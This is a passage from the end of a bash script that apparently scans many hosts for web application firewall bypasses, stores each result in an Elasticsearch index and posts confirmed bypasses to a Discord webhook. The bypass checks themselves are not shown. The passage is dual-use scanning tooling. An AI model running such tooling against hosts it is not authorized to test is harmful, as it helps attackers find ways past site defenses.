        }')"
      discord_post "$hook" "$payload" || true
    fi
  else
    log "  no bypass found on any of ${#all_paths[@]} path(s)"
    # Mark cooldown even on miss
    es_curl -H 'Content-Type: application/json' \
      -X POST "$ES_URL/$INDEX_NAME/_update/$host" \
      -d "$(jq -nc --arg n "$now_iso" --arg waf "$waf" \
        '{"doc":{"bypass_at":$n,"bypass_confirmed":false,"bypass_checked_at":$n,"bypass_waf":$waf}}')" \
      > /dev/null 2>&1 || true
  fi

  sleep 0.2
done < <(printf '%s' "$resp" | jq -c '.hits.hits[]')

es_curl -X POST "$ES_URL/$INDEX_NAME/_refresh" > /dev/null 2>&1 || true

log "=== bypass cycle done: $confirmed_count host(s) with confirmed bypass(es) of $host_count tested ==="
